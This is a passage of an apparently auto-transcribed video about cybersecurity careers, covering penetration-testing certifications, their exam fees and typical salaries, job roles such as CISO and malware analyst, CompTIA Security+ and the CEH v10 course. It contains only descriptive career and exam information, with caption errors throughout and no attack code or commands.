passing varies from 60 to 85 percent so
there is no exact grade and all the
questions have different weightages so
depending on the questions that have
been given to you and the way that you
have answered them you would pass at
either sixty percent or you would pass
when you've scored 85 percent once you
are CE at certified which is a very
technical certification you will be
qualified to apply for job roles as a
penetration tester or a security
engineer these are job roles where you
would be responsible of ethically trying
to attack applications uh servers
switches and try to find out
vulnerabilities within them the training
of this certification will make you
Adept in most of these tools that are
required there are a lot of practicals
in this training and if you successfully
completed those practicals clearing the
exam is a easy task with the practicals
comes your knowledge and would help you
understand how you would be performing
penetration tests in the real world an
average annual salary in the USA for a
ceh certified person is around ninety
one thousand dollars and in India is
around 476 000 odd rupees the salaries
would vary as far as organizations are
concerned uh more established
organizations can afford to pay a little
bit more but these are average salaries
that we have seen across the market the
next certification is the G Pen also
known as the global information
assurance certification penetration
tester this certification looks into the
different pen testing practices and
methods also focuses on the various
problems and Pen testing so again this
is where you're getting certified as a
penetration tester so it's again a
technical certification where your
knowledge on networking applications and
security of which would be tested you
will be trained on this of course so the
training will include all these areas
where you need to focus identify those
problems and thus be ready for the real
world scenarios the candidate will have
to understand networking Concepts and
operating systems in his Linux and
windows and you should be very well
aware of the TCP protocols this is true
for any of the technical certifications
for ethical hacking giac is the
certification provider it's again a very
well renowned and well accepted
certification Authority across the globe
the exam fees are 1899 82 215 questions
to be answered in three hours now why 82
215 it depends on the test that has been
Associated and depending on how you are
answering those questions uh you would
be given those many number of questions
to begin with but all of these need to
be answered in three hours 74 is the
past percentage that is required to
clear this exam the average annual
salary in the USA is around 96 000 while
in India it is around similar to
certified ethical hacking then looking
at the next certification from offensive
security called the oscp offensive
security certified professional this is
another penetration testing
certification highly technical in nature
and it is an entirely Hands-On
certification the previous two
certifications that we saw we talked
about CH where there are two different
exams you could either take the
theoretical exam and give your mcqs or
you could take the Practical one here
you don't have an option this is a
practical exam so the test is conducted
on a virtual Network so they send out
instructions to you there's a virtual
lab that is given out to you and they
give you the questions and you have to
perform those assessments create those
reports and provide it to the certifying
Authority in this case offensive
security uh if you match their criterias
of whatever you have identified in those
reports you get certified here the
requirements of good understanding of
networking protocols how systems
function how Kali Linux operating system
functions and the candidate must for
complete offensive Securities
penetration testing with the Khali Linux
course and pass the Hands-On exam so
this focuses purely on Kali Linux Kali
Linux is an operating system that is
freely distributed over the internet and
comes structured with around 300 plus
tools used for ethical hacking so this
scores totally relies on Kali Linux for
you to use as a tool set for penetration
testing the certificate provider has
stated is offensive security the name of
the course is oscp offensive security
certified professional exam is around
800 to
1550. Now understand that this exam is
Technical and is Hands-On so for you to
prepare for this exam they come up with
virtual Labs where you can start
practicing and honing your skills
depending on the number of days for
which you have purchased the access to
that particular Labs the amount will
vary from 800 which would be the minimum
access days available to 1550 where the
maximum number of days would be given to
you for practicing once you are ready
even during the time time span of where
you have that access once you are ready
for the exam you can you can attempt the
exam and clear the average annual salary
is similar around ninety one thousand
dollars for the US market and 900 and
5000 rupees in the Indian market then
looking at the CompTIA pen Test Plus
CompTIA is another certification
Authority or a certification provider a
training provider that that will help
you get yourself certified in the
ethical hacking space so they have
certification called pen Test Plus which
is focused towards penetration testing
so it is an intermediate level
certification it assess the
vulnerability assessment and the
penetration testing skills of a
candidate here the training will provide
you with all the essentials where it
will help you identify how to do
vulnerability assessments how to
identify those vulnerabilities and then
which tools to utilize for what kind of
a penetration test for the requirements
a minimum of three to four years of
hands-on experience in the information
security field also a CompTIA Security
Plus or a network Plus or equivalent
knowledge is required so in the network
plus they talk about securing networks
and they help you understand the OSI
layers the TCP layers and help you
understand the protocols and all of
those things so having that knowledge is
an added Advantage the certificate
provider is CompTIA and the cost of the
exam is around 349 dollars maximum
number of questions is 85 and I think
it's a three hour exam the passing
percentage is uh scoring 750 marks out
of a possible 900 so the scale is the
minimum you can ever score is 100 if
you're completely and be prepared the
maximum you can score is 900 uh you get
a leeway of 150 marks for your
certifications so you have to score a
minimum of 750 to clear the exam average
annual salary for a Hampshire certified
penetration test plus professional is
ninety seven thousand dollars in the US
market and in the Indian market it would
be around 5 lakh rupees then comes the
license penetration tester now this is
an advanced certificate again from EC
Council this is where AC counselor gives
you a license which certifies that you
have undergone thorough training and
have cleared your exam in which you can
conduct or lead a audit for
vulnerability assessment and penetration
testing it is an expert level
certification comes after the ceh
certification it is the ultimate test
which tests this candidate's penetration
testing skills so there are two
certifications over here one is the ecsa
EC Council certified security analyst
once you clear that you get you can
appear for the license penetration
tester both of these are Hands-On
certifications so you will be given a
Virtual Lab you will be given a scenario
in which you'll have to perform some
assessments create reports submitted to
the EC Council they will analyze your
reports if they meet the criterias that
have been identified you would then be
certified as a licensed penetration
Tester the candidate must be above 18
years of age a recertification is
required every three years so the
validity is three years after three
years you will have to be recertified or
or there is a continuing Point education
system over there where you can score
points by publishing articles by
attending trainings or giving out
trainings and you can get yourself free
certified it is preferred that the
candidate has CH and the ecsa
certification so the previous
certification that we saw certified
ethical hacker and then the ecsa EC
Council certified security analyst after
which you can appear for the lpt license
penetration Tester the certificate
provider again is EC Council the
licensed penetration tester exam has a
different process the candidate must
purchase an exam dashboard for 899 which
is valid for a year so once you purchase
the voucher the validity is one year you
can prepare within that one year and
then give the exam and attain the
certification only once you are ready
the exam can be scheduled and you can
give that exam the exam consists of
three different levels each level has
three different challenges the candidate
must pass at least one challenge in
order to qualify for the next level and
for each level the exam is 6 hour hours
so this is a grueling exam this is
Hands-On we are giving you challenges
and they are going to test you on your
skills as a penetration tester so be
ready to be very Hands-On for this kind
of a certification average annual salary
in the US is around 100 000 and above
and in India 825 000 and above in
today's world data is generated in
exchange at a high speed did you know
that 2.5 quintillion bytes of data are
generated every day companies all over
the world make crucial Decisions by
analyzing all of this data with the rise
of data there has been a tremendous
increase in the number of cyber crimes
across the globe to prevent cyber
attacks cyber security is implemented so
what is cyber security it is nothing but
the practice of protecting networks
programs computer systems and their
components from unauthorized digital
access as mentioned earlier companies
rely on data and it is required that the
data is not compromised or stolen to do
this job we have various cyber security
professionals who are skilled to protect
data from cyber attacks there has been a
sky high growth in the number of cyber
security jobs this growth will only
double in the near future as companies
will always be on the lookout for
skilled professionals who can protect
the confidentiality of the data so now
that we know why cyber security jobs are
important let us have a look at the
various cyber security job rules there
are various kinds of cyber security job
rules let's go through few of the top
paying job roles going in the descending
order of their salary structures in the
USA we first have the Chief Information
security officer job role followed by
the security architect penetration
tester then we have cyber security
engineer malware analyst and finally we
will look into the computer forensic
Analyst job role I will now preview
about each of these job roles
individually and look into their
responsibilities skills and salary
structures both in the USA and in India
so let's start off with Chief
Information Security Officer a ciso is a
senior level officer in any organization
he is entrusted with the safety of the
data in an organization a ciso has
various responsibilities they are
required to develop Implement and
maintain an organization's security and
risk management program they also
communicate with their organization
stakeholders and brief them about
various information related security
concerns by doing so they are able to
implement a better security system for
an organization at times a ciso would
have to also recruit an ID team's
members they need to make sure that the
candidate is knowledgeable and skilled a
company's risk and vulnerabilities have
to be predicted beforehand prediction of
such risks and vulnerabilities are taken
care of by a ciso they play a major role
in preventing cyber attacks in any
organization let's now look at the
different skills required to be a chief
information security officer first and
foremost a candidate must have good
communication and presentation skills
this is very important for any
organization a degree in computer
science along with an MBA is a preferred
qualification MBA is not mandatory but
there is an added Advantage if the
candidate has an MBA along with a
computer science degree the candidate
must be good at handling security
breaches it is preferred that the
candidate has prior experience of
handling a security breach and who is
also good with Incident Management many
employers prefer candidates who have
Global certifications to become a chief
information security officer the
preferred certifications are cism that
is certified information security
manager and certified information system
security professional CIA ISP if a
candidate has either of these
certifications they have a better chance
of getting a job as a chief information
security officer let's now move on to
their salary structures a ciso earns
nearly 180 000 dollars in the USA in
India the salary is nearly 25 lakhs per
annum that's a lot of money so these
were the responsibilities skills and the
salary structure of a chief information
security officer let's move on to our
next role our next rule is that of a
security architect a security architect
maintains the security of an
organization's computer systems they
prevent the computer systems from
malware attacks let's look into their
responsibilities first and foremost our
security architect identifies weak spots
in a system by performing vulnerability
tests these tests are carried out on a
regular basis along with vulnerability
tests risk analysis and security
assessments are also done by a security
architect installation of routers VPN
and firewalls are approved by a security
architect these devices are very
important when it comes to the security
of an information system well a security
architect rightly approves the
installation of these devices digital
signatures and public key
infrastructures are designed in addition
to all the above responsibilities a
security architect also provides
technical assistance and guidance to the
other security team members let's now
move on to the skills required to be a
security architect first and foremost
the candidate must have a computer
science or an information technology
degree coming to the experience the
candidate must have an experience in the
field of risk management as the role of
a security architect is a lot to do with
managing risks understanding of the
network Basics and various security
protocols along with cryptography is
required to be a good security architect
lastly the preferred certification to
become a security architect is that of a
cissp which is certified information
system security professional as
mentioned earlier this is only a
preferred certification a candidate who
has this certification has a higher
chance of bagging a security architect
job let's now look into the different
salary structures in the USA and in
India in the USA a security architect
earns nearly 123
000 dollars per annum in India a
security architect earns nearly 20 lakhs
per annum so that's all about security
architect let's now move on to our next
role that is penetration tester a
penetration tester also known as an
ethical hacker is a cyber security
professional who tries to exploit a
security system's vulnerabilities just
like how a hacker would do a penetration
tester mimics the role of a hacker let's
look into the various responsibilities
of a penetration tester as the name
suggests a penetration tester needs to
perform penetration tests to discover
and identify vulnerabilities in a system
in addition to this they are also
responsible for Designing new
penetration tools all the penetration
tests results are documented and based
on the document new security measures
are discussed with the other it team and
the management a penetration tester
performs tests by developing codes and
they also conduct security audits which
help them understand the vulnerabilities
in a system let's now look into the
different skills required to be a
penetration tester a candidate must have
one to four years of experience in the
information security field knowledge of
Windows Linux Unix operating systems is
required also the candidate must know C
and C plus plus languages such as Java
PHP and Perl are preferred by employers
but not a requirement to successfully
back the position of a penetration
tester that prefer certifications are
certified ethical hacker that is CH and
certified expert penetration test term
that is cept let's look into the salary
structures of a penetration tester in
the USA a penetration tester earns
nearly 117 thousand dollars per annum
and in India a penetration tester makes
nearly 4 lakh rupees per annum
so those who are the responsibilities
skills and salary structures of a
penetration tester let's now move on to
our next job role that is cyber security
engineer on the whole a cyber security
engineer protects an organization's
Network and its data they also plan
security measures to prevent an
organization from Cyber attack let's
look into the responsibilities of a
cyber security engineer they design
cyber security platforms for a company
they are also responsible for planning
and implementing cyber security measures
well a cyber security engineer solely
designs plans maintains and implements
security measures in an organization
they are also required to report and
communicate with the other teams in an
organization a cyber security engineer
is different from a network security
engineer while a network security
engineer looks into the troubleshooting
a cyber security engineer looks into the
prevention of cyber attacks let's look
into the skills required to become a
cyber security engineer just like the
other job profiles a degree in computer
science or information technology is a
must well two years of experience in the
relevant field is required to become a
cyber security engineer a cyber security
engineer is needed to design security
systems hence a candidate with a good
problem solving skill is required along
with good problem solving skills the
candidate must also be good with
networking skills as mentioned earlier
knowledge of C and C plus plus is a must
Java and python knowledge is preferred
to be a cyber security engineer moving
on to the salary a cyber security
engineer earns nearly 96 000 in the USA
whereas in India a cyber security
engineer earns nearly 7 lakh rupees per
annum moving on to our next job role
that is malware analyst as the name
suggests a malware analyst is one who
ident identifies various cyber threats
such as worms viruses Trojans boats to
understand their nature a malware
analyst is skilled at analyzing the
different malware threats in a system
let's not look into a malware analysts
responsibilities they're responsible to
identify threats and once they identify
they are supposed to document the
methods to avoid such malware threats
they also research and develop malware
protection tools various malware
protection tools are developed by
malware analysts so that the next time a
cyber threat occurs they are able to
easily identify in addition to the about
responsibilities a malware analyst is
also responsible to constantly be
updated with the new malware threats
moving to the skills required a
candidate must know Windows Linux Unix
operating systems and knowledge of C and
C plus plus is a must usage of tools
like Ida Pro early ddg reg short and TCP
view is suggested having a giac reverse
engineering malware certification is a
plus point the certification is only a
preferred certification it is not a must
that the candidate must possess this
certification moving on to the salary
structure a malware analyst earns nearly
eighty thousand dollars in the USA and
earns nearly rupees 6 lakhs per annum in
India so those were the skills
responsibilities and salary structure of
a malware analyst let's move on to our
last job role that is computer forensic
analyst previously we have seen the job
roles wherein they try to protect a
company from a Cyber attack in this role
we will see how a computer forensic
analyst Works after a Cyber attack a
computer forensic analyst works on cases
following an attack they collect digital
evidences to retrieve information let's
look into their responsibilities with
the help of various investigation tools
a computer forensic analyst gathers
evidences from a system which was a
victim of a Cyber attack their main
responsibility lies in recovering
deleted manipulated or stolen data a
computer forensic analyst helps various
officials in investigating a case by
discovering evidences from data which
was manipulated or compromised there
have been a lot of cases where a
computer forensic analyst has come to
the rescue of the police department
moving on to the skills the candidate
must hold a bachelor's degree and work
experience in the related field is
required for the post of a computer
forensic analyst it is not necessary
that the candidate must hold a computer
science degree but the candidate must
have relevant work experience a
candidate must have knowledge of
networking law and criminal
investigation as they have to do a lot
with investigating cases as well a sound
analytical mind is critical and as they
have to analyze data and arrive at
conclusions as to identify the Cyber
criminals the preferred certifications
to become a computer forensic analyst
are certified forensic computer examiner
that is cfce and certified computer
examiner that is CCE well these were the
skill sets required to become a computer
forensic analyst moving on to the salary
structures a computer forensic analyst
earns nearly 71 000 in the USA and in
India a computer forensic analyst earns
nearly 8 lakh rupees per annum that was
all about computer forensic analyst well
those were the six top eight jobs in the
field of cyber security now I will run
you through a sample resume of a cyber
security engineer this is only a sample
resume of a cyber security engineer you
can alter it according to your own
preference here we first start off with
the name and your email ID and phone
number then a quick summary about your
self and what you're good at and what
you are looking for in an organization
after which you can give your LinkedIn
profile link and your GitHub profile
link if you have one moving on to the
experience here you would have to give
the company's name and the tenure
ideally for a cyber security engineer
the minimum number of years required is
two and below that you can write the
different responsibilities that were
taken care by you in your previous
organization TCP Network Administration
and security monitoring are two
important responsibilities that any
cyber security engineer must have on
their resume it is great if you have
configured firewalls and IDs as well
underneath that you can mention the
education and it is required that you
have a degree in computer science or an
information technology you can then
mention your University and your GPA
moving on to the skills we have
technical skills and non-technical
skills here under technical skills you
would have to write the languages that
are known to you for example C C plus
plus which is a must Java and python are
preferred to knowledge of Windows Linux
and Unix operating systems will also
have to be on your resume if you're
applying for a post of a cyber security
engineer the other skills depend from
person to person here I have IDs and IPS
penetration vulnerability testing
encryption Technologies knowledge of SQL
and at the end you can also write the
certifications ideally a cyber security
engineer must have CCNA ccnp
certifications in addition to it even a
com TI plus certification is preferred
moving on to the non-technical skills
here you can mention the languages that
you're good at the different
competitions that you have participated
in it can also have your co-curricular
activities and anything to do with
problem solving would also be an added
Advantage first let me briefly introduce
comtr before moving on to the CompTIA
Security Plus certification
the Computing technology industry
Association are better known as CompTIA
is a leading vendor neutral I.T
certification provider in the world
CompTIA is considered one of the top
trade associations its vendor neutral
certification program is undoubtedly one
of the best in the IT industry
for more than two decades CompTIA has
developed certification exams and
training for networking security open
source development and Cloud to name a
few
CompTIA certifications continue to
address the requirements and necessities
of today's technology challenges
CompTIA certifications are grouped by
skill set presently CompTIA
certifications are classified into four
areas core infrastructure cyber security
and additional professional
certifications
if you have a job that may involve some
sort of certification you must consider
obtaining that certification
certifications are very crucial CompTIA
certifications are a way for it
professionals to demonstrate their
knowledge of computers
let us know have a look at a few of the
certifications offered by CompTIA
first we have CompTIA a plus
CompTIA a plus certification is an
entry-level certification for it
technicians
this certification is designed for
employees who are seeking a career as a
support service center or networking
technician
this certification tests a candidate's
understanding of basic networking
troubleshooting and security skills
it covers laptop and PC Hardware
software installation and configuration
of operating systems
according to CompTIA more than one
million it professionals hold the a plus
certification
next we have CompTIA Network Plus
you can either start with the a plus
certification however if you have the
experience you can move directly to the
CompTIA Network plus certification
this certification is for professionals
who carry a minimum of nine months of
networking experience
here a candidate must be familiar with
networking Technologies topologies
security installation and configuration
and troubleshooting of wireless and
wired network devices
next we have CompTIA Security Plus
CompTIA Security Plus covers network
security Concepts threats and
vulnerabilities Access Control identity
management cryptography and much more we
will closely look at the CompTIA
Security Plus certification in this
video and finally that's CompTIA Cloud
plus the CompTIA Cloud plus
certification Finds Its importance as
the cloud computing Market continues to
grow by Leaps and Bounds this
certification targets it professionals
with two to three years of experience in
storage networking or data center
Administration the certification exam
test the candidate's knowledge of cloud
Technologies Cloud markets and hybrid
and multi-cloud solutions those were a
few of the certifications offered by
CompTIA there are several other
certifications like CompTIA Linux plus
CompTIA pen Test Plus and CompTIA
project plus to name a few
now let us have a look at the CompTIA
Security Plus certification in detail so
what is the CompTIA Security Plus
certification
well the CompTIA Security Plus
certification is a leading entry-level
it certification it is an essential
certification for professionals working
in the IT industry
it is one of the First Security
certifications that must be earned by it
professionals
it provides the core knowledge required
of any cyber security Rule and provides
a springboard to various intermediate
level cyber security jobs
this certification teaches you how to
secure applications devices and networks
it also focuses on Hands-On practical
skills in the field of network security
the certification teaches you skills
from spotting and mitigating risks to
troubleshooting security incidents
it is to be noted that it professionals
with CompTIA Security Plus know how to
address security incidents and not just
identify them
so now that you know what CompTIA
Security Plus certification is about let
us look at a few points as to why a
professional must choose this
certification
the first reason being it's a vendor
neutral certification
the CompTIA Security Plus certification
is vendor neutral which implies that you
don't have to Center on technology and
security of a precise vendor the skills
and knowledge achieved through this
certification make Security
Professionals and network administrators
become in demand in the it markets
please
the CompTIA Security Plus certification
is globally acknowledged to be one of
the fundamental security certifications
in the field of cyber security
CompTIA Security Plus certification is
universally recognized and trusted
across the world
Security Plus provides Hands-On skills
one of the few entry-level cyber
security certifications that emphasizes
on Hands-On practical skills
this ensures a security professional is
better prepared to solve several complex
issues of the current times
the CompTIA Security Plus certification
is aligned with the latest techniques
and Trends it covers core technical
skills in risk assessment and management
incident response forensics and Cloud
operations to name a few
thereby ensuring high performance on the
job having this security certification
provides you a wider breadth of career
opportunities
the CompTIA Security Plus exam is
Performance Based which makes the
Knowledge and Skills learned more
applicable
there are numerous job roles that turn
to Security Plus to supplement Baseline
cyber security skills
cyber Security Professionals are in
demand by organizations from both
private and public areas
with this certification you can take up
jobs later to compliance and operational
security threats and vulnerabilities
access control and identity management
and cryptography to name a few
it is to be also noted that
professionals with the Security Plus
certification have greater opportunities
of receiving higher salaries than
non-certified professionals
another benefit of this certification is
that if you wish to get a cyber security
government job obtaining the CompTIA
Security Plus certification will be an
ideal starting point for you
so now that you know the perks of
achieving this certification what you
have to do to achieve this well before
you can achieve this certification you
have to clear the CompTIA Security Plus
exam
let us now have an overview of the
CompTIA Security Plus exam
first and foremost who can take a pump
here does not have any set prerequisites
organizations recommend that candidates
meet these two criterias let's have a
look at the two criterias
firstly the CompTIA Security Plus is for
it professionals who carry a minimum of
two years of experience in the it
Administration focusing on security
the CompTIA Security Plus is ideal for
professionals who are looking to start
or Advance a career in security
obtaining this certification prepares
the Professionals for job roles like
system administrator Security
administrator network administrator
Junior penetration tester security
engineer and security consultant to name
a few
though CompTIA security class is an
entry-level certification it is strongly
recommended that you get the a plus and
network plus credentials before
proceeding to the Security Plus
certification
this will ensure that you have the
required technical skills like
configuring managing and troubleshooting
Networks
now let's move on and understand the
CompTIA Security Plus exam details
CompTIA Security Plus
sy0601 is the latest exam code that was
launched on 12th November 2020. the
sy0501 English language exam retized on
31 July 2021 hence we recommend you to
opt for the sy0601 exam there are a
maximum of 90 questions CompTIA Security
Plus exam has multiple choice questions
but some CompTIA certification exams
include performance-based questions or
pbqs Performance Based questions test a
candidate's ability to solve problems in
a simulated environment
the passing score for this certification
exam is 750 on a scale of 100 to 900.
the duration of the exam is 90 minutes
so time management is crucial to clear
the exam since you need to solve each
question within a minute CompTIA
Security Plus
sy0601 exam is currently available in
English and Japanese language you can
enroll for the exam by booking a slot
online or registering with Pearson VUE
testing centers
the price of the CompTIA Security Plus
certification exam is 370 US dollars in
Australia the price is 500 Australian
dollars and in European currency it is
334 Euros let us now look at the focus
areas of CompTIA Security Plus exam
firstly this exam focuses on the core
cyber security skills required of any
cyber security rule such as security
incident handling and response intrusion
detection malware prevention Etc the
second area of focus is threats attacks
and vulnerabilities this includes
analyzing indicators of compromise and
determining types of malware or
comparing and contrasting types of
attacks
next up we have identity and access
management
this topic emphasizes on implementing
identity and access management controls
or differentiating common account
management practices
the fourth domain that CompTIA Security
Plus focuses on is risk management this
domain describes the importance of
policies plaque questions related to
comparing and contrasting basic concepts
of cryptography and implementing public
key infrastructure
another key Focus area of this exam is
how to troubleshoot common security
issues and deploy mobile devices
securely
now coming to the final section of this
video where we look at the important
skills that you will acquire after
completing the CompTIA Security Plus
certification exam
first you will learn to detect various
types of compromise and understand
penetration testing and vulnerability
scanning Concepts
this certification will give knowledge
to assess the security posture of an
Enterprise Network and recommend and
Implement appropriate Security Solutions
you will also get an idea of installing
configuring and deploying Network
components while assessing and
troubleshooting issues to support
organizational security you will gain
the decide skills to Monitor and secure
hybrid environments including Cloud
mobile and iot
CompTIA Security Plus certification
exams give the experience to install and
configure identity and access services
you will understand how to identify
analyze and respond to security events
and incidents
finally you will grab another crucial
skill that is to implement best
practices on risk management
CompTIA Security Plus certification will
make you understand how to implement and
summarize risk management best practices
and the business impact
it ensures you operate with an awareness
of applicable laws and policies
including the principles of governance
risk and compliance
that was all about the CompTIA Security
Plus exam taking up this exam will help
you learn a lot about cyber security and
acquire the necessary skills that will
help you become a greater cyber security
professional
this is why organizations look for
professionals with CompTIA certification
this certification is evidence of your
expertise in the security field
CompTIA Security Plus certification is
prevalent among Security Professionals
although the exam requires a lot of hard
work to crack the reward is very
fruitful all the best to everyone who
wishes to be CompTIA Security Plus
certified now let's begin with who is a
certified ethical hacker a certified
ethical hacker is a person who's also
known as ethical hacker an ethical
hacker is just the opposite of an hacker
a hacker is a person who with malicious
intent tries to misuse vulnerabilities
that they have identified in an
organization structure and then gain
access to unauthorized data whereas an
ethical hacker does the same thing they
try to locate the weakness they try to
look at the vulnerabilities and they see
how they can be misused however the
intent is completely different and that
is what differentiates a hacker from an
ethical hacker hacker would be a
criminal with a malicious intent who
would try to misuse and personally gain
by doing criminal activity from that
political activity that they have done
whereas ethical hacker would try to of
the organization in an authorized manner
so that's where the permission comes
into the picture the ethical hacker has
permission from the organization to
conduct some activity that would
identify vulnerabilities or weaknesses
in the information technology structure
of that organization and then once they
have been identified practical hacker
would then help the organization to plug
those vulnerabilities rather than misuse
those vulnerabilities so any person who
completes CH version 10 certification is
known as a certified ethical hacker so
there's a certification once you
complete that once you pass the exams
you can essentially call yourself as a
certified ethical hacker and you're
going to get a certificate with the same
terminology so as you can see in the
diagram your responsibility would be as
a certified ethical hacker would be with
the proper permission of the
organization with the authorization
coming in with contracts coming in you
would legally help the organization to
identify those weaknesses and
vulnerabilities and once you find them
you're going to report them to the
organization and you're going to help
the organization with remediation plan
which should help them remediate
mitigate and resolve the vulnerabilities
that you have identified thus making the
organization's security structure a lot
better based on which black hat hackers
or malicious hackers would be unable to
attack the organization so what is CH
version 10. now this course was
initially introduced in September 2015
and I think if you look at the
versioning this is the 10th version that
is there in the market so essentially CH
or the certified ethical hacking course
as the course itself has been for a long
time in the industry it's a very well
accepted course and it's a well-renowned
course the current version as it is was
introduced in September 2015 and is one
of the toughest certifications in the
cyber security field this includes a lot
of information that you have to learn
that you have to know before you can
attempt the certification you will
master all ethical hacking methodologies
that are used in penetration testing and
ethical hacking situations what does
that mean that means that CH version 10
is a structure course that will help you
look at all the phases that are used in
ethical hacking all the terminologies
that are utilized all the tools that are
utilized in such a manner that you can
penetration test or a vulnerability
assessment and identify and test the
vulnerabilities for their complexity and
this course once you complete the course
you would have mastered all the ethical
hacking techniques that are required
there are two exams one is a written
exam and the other is a practical exam
now you can opt for either or the
written exam is basically a multiple
choice question exam where they'll ask
you scenario based questions and you
have to answer those questions that is
something that we are going to look into
during this video the Practical exam is
basically a simulation exam where they
give you a scenario and you have to
complete some complete those tests and
prove that you are a good ethical hacker
based on the report that you give if the
report tallies to what the test was you
would be clearing that exam so practical
exam is a little bit tougher it's more
Hands-On it tests this actual skills
that you would perform in a hacking
scenario foreign
going to be that much tougher the
written exam to give it Credence tests
you a lot on your mentality on your
thought process on your judgment
characteristics so they will give you a
scenario and ask you what do you think
is happening what does this attack
tantamount to or would be then what what
would be the next step in the particular
attack that they are describing does
it's more of an intellectual test where
you're when your thought processes are
being checked and you are giving those
examples so what would be the difference
between these exams in a practical exam
you would be conducting all those steps
yourself and you would be reaching a
conclusion so here essentially you're
being tested on the skills that you have
developed on the execution part of it
and to see whether you can execute a
test end to end whereas in a written
exam you would be put in the middle of a
test where you have to assume something
where you have to understand what the
steps would have been performed in the
in the previous steps and what would be
the expected result and you're supposed
to analyze that and and then come to the
correct answer so if there's a question
which which exam is better written or
practical the answer to that is from
intellectual perspective a written exam
would be a lot tougher than a practical
exam and from an execution perspective a
practical exam would be tougher than a
written exam so it depends on us which
exam we want to give both of them are
widely accepted and well respected in
the information security field so it's
just the option that we choose which
exam we want to give now this course the
version 10 course is purely attack based
course okay it is an offensive course
there is no defensive mechanisms so if
you're looking for questions of how to
secure yourself on the internet how to
securely configure operating system or
how to securely configure a server how
to configure a firewall this is not the
certification this basically talks about
attacking those devices so if you come
across a firewall how would you test a
firewall how would you identify
vulnerabilities in those and how would
you bypass a firewall similarly if you
come across a server how are you going
to attack and hack the server Let It Be
Windows online space so this basically
becomes attack based course you're
looking at offensive mechanisms over
here and not defensive ones at all so
what's new in this version in this
version there's a new module for iot
Internet of Things it focuses on
emerging attacks vectors like Cloud
artificial intelligence and machine
machine learning it basically talks
about smart devices and it talks about
the vulnerabilities the risks that the
smart devices face in today's world for
example it will tell you about the
industries that are utilizing all these
smart devices why are they utilizing it
for what kind of devices they are
utilizing and what are the risks within
those devices it will also give you a
lot of tools for you to practice upon to
identify such iot devices what would
constitute an iot or Internet of Things
device any device which has an IP
address and can connect to the internet
and create data so even your smart watch
your smartphone your cars that have
internet connectivity nowadays uh your
Google homes Amazon Alexa's all of these
devices would come under the iot
umbrella and have you ever wondered
about about sitting at home having a
Wi-Fi having all of these devices even a
smart TV if you will connected to the
Wi-Fi and have you ever questioned how a
hacker would then be able to access your
home through all of these devices record
information and basically just spy on
you similarly an organization where
they're utilizing iot they would be
vulnerable for the same vulnerabilities
and this course does include iot
security to a certain extent where we
talk about vulnerabilities and how to
identify those vulnerabilities in iot
then there's a new vulnerability
analysis module where it gives you risk
assessment it talks about CVSs scoring
systems it talks about how to do a
vulnerability Management program in the
first place what are the steps required
in a vulnerability Management program
how should it be reputable and how it
should be measurable as a program and
what should be the outcome so basically
it will give you a structured way of how
to do a vulnerability management
assessment and how do you want to
achieve the end goal thus leading you to
a penetration test so all the modules
are leveled up what do you mean by
leveled up that means have been updated
to the latest tools latest standards
latest Technologies so we've got
cryptographic attacks you have got
attacks on applications like SQL
injection we will be talking about
packet sniffing using various tools all
of these are upgraded which means they
are up to the latest operating system so
even when we do this course you'll be
looking at operating systems like
Windows 10 Windows 8 Windows Server 2012
Windows Server 2016 Kali Linux machines
Android machines and Ubuntu desktop as
well so all of the operating systems are
latest the tools are latest and you will
be interacting with these tools and then
there's a mobile security toolkit as
well which will help you do a
penetration test on a mobile device so
these are what is new in version 10. now
let's talk about the roles and
responsibilities that ethical hacker
should have when they actually go into
the world now what are the
responsibilities roles what are the
capabilities that we should have that we
should be able to look at scripts that
would test for vulnerability so for
example a SQL injection attack it's a
screen base attack let's say cross-site
scripting attack that is again going to
be a script based attack so we uh maybe
we want to go ahead a little bit look at
Windows systems and do a Powershell
attack and know about partial scripting
a little bit if you look at Linux
Windows there's a bash shell where there
is Bash scripting and you'll want to
learn that scripting as well now the
course doesn't include all these
scripting languages it does help you
understand what these scripting
languages are and it does have some
basic introduction to how these
languages can be utilized to create
those scripts then we also want to
develop tools to increase security you
want to look at those commands that are
utilized on all operating systems you
want to look at the capabilities of
operating systems of how to create
security parameters and ensure the
operating systems and applications
devices are secure uh you should be able
to perform risk assessment now when you
say risk assessment risk assessment is
the likelihood of an attack being
actually executed on an organization
based on the threats and the
vulnerabilities that we have identified
so risk assessment is something that you
find out about vulnerability and then
you try to figure out in a hypothetical
manner of what is the likelihood of that
vulnerability being exploited by a
hacker if they find that vulnerability
and if they do execute that what is the
impact that is going to happen on the
organization and what is the penalties
or the repercussions that the
organization is going to face if that
vulnerability is exploited that's what a
risk assessment is then we should also
be able to develop security policies a
set of security policies and Implement
them to ensure that the security
mechanisms are standardized and are
consistent and then we should also look
at training staff for network security
to ensure that they are aware of these
vulnerabilities and they know what the
responsibilities are to maintain some
semblance of security in the
organization so why do we want to become
a certified ethical hacker now since
you're watching this video it's easy to
assume that we all are interested in
security we all are interested in
hacking but hacking is not a real job
for us to get a job in the industry on a
security parameter or information
security parameter we want to become a
certified ethical hacker so if you look
at the popular hacking cases that have
happened in 1990s there was a national
Crackdown on criminals Microsoft NT
operating system was hacked now this was
back in the 90s when security wasn't
that much evolved and there were a lot
of attacks back then uh that crippled
infrastructure that crippled Banks when
they started realizing that Computing
isn't as easy as it seems of course if
you use a computer the functionality is
always there but if the functionality is
not properly configured you're just
exposing yourself to cyber criminals
where they're going to steal information
and your organization may just go
bankrupt because of that in 2013 an
example Adobe reported 2.9 Million
accounts as stolen in 2016 Cash Plus key
which is an Internet Security firm uh
announced that there was 758 million
malicious attacks that occurred
worldwide imagine that 758 million
malicious attacks that were identified
and reported in 2018 Facebook reported a
loss of 30 million to accounts that were
stolen 2018 again quora reported 100
million customer accounts being stolen
and in 2018 again Marriott 500 million
Travelers accounts stolen and
manipulated now when you see a
conference tool and how does it affect
the organizations now first and foremost
if those accounts were stolen that means
usernames and passwords were cracked and
those accounts may have contained credit
card information or may have contained
some personal information that would
identify the personal uh the person and
does make them gullible for a social
engineering attack or an identity theft
attack so it has a cascading effect if I
would have been affected or you would
have been affected with these attacks
the repercussions would have been
catastrophic your credit card
information being stolen that means
somebody else would have misused it and
you would have seen a huge bill come to
you come your way now you can go back to
the bank and dispute that but that
that's again a dispute that you're
trying to have with the bank for
something that you didn't do which
requires a lot of energy and a lot of
time and at the end of it somebody has
to pay for that particular loss now in
this scenario the bank would have had to
Bear the loss but then that's a loss for
the bank and bank doesn't want to do
that and that's where they would try to
hire certified ethical hackers who would
try to test these vulnerabilities and
plug them in so that the end consumer is
also secured the bank is also secure
right in this case uh Marriott there
